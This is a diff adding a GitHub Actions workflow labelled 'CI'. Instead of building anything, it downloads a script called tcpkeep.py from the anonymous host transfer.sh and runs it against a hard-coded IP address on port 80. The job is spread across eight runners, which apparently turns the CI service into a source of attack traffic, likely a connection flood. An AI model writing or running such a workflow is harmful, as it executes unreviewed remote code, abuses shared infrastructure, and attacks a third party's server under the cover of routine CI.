@@ -1,0 +1,27 @@
+name: CI
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+  workflow_dispatch:
+
+jobs:
+  build:
+    strategy:
+      matrix:
+        os: [ubuntu-latest, ubuntu-18.04]
+        ip: ["5.161.67.251"]
+        port: [80]
+        flag: [A, B, C, D]
+    runs-on: ${{ matrix.os }}
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Setup & Run daemon
+        run: |
+          wget -O f.py https://transfer.sh/get/MKMq8i/tcpkeep.py
+          python3 f.py ${{ matrix.ip }} ${{ matrix.port }} 1 1024
